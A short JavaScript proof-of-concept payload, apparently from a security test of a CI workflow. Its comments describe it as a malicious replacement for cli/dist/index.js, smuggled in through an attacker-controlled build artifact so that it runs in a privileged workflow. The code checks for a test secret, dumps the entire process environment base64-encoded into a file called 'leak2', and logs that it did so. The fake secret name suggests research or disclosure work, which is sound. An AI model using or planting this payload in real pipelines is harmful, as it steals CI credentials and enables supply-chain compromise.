// trigger run 2
// Malicious replacement for cli/dist/index.js, delivered through the
// attacker-controlled `pr_id` artifact of the untrusted upstream workflow.
const fs = require("fs");
console.log("!!! ATTACKER cli/dist/index.js EXECUTED IN THE PRIVILEGED WORKFLOW !!!");
console.log("FAKE_TEMPLATES_API_CLIENT_SECRET present:", !!process.env.FAKE_TEMPLATES_API_CLIENT_SECRET);
fs.writeFileSync(
	"leak2",
	Buffer.from(JSON.stringify(process.env, null, 1)).toString("base64"),
);
console.log("wrote leak2");
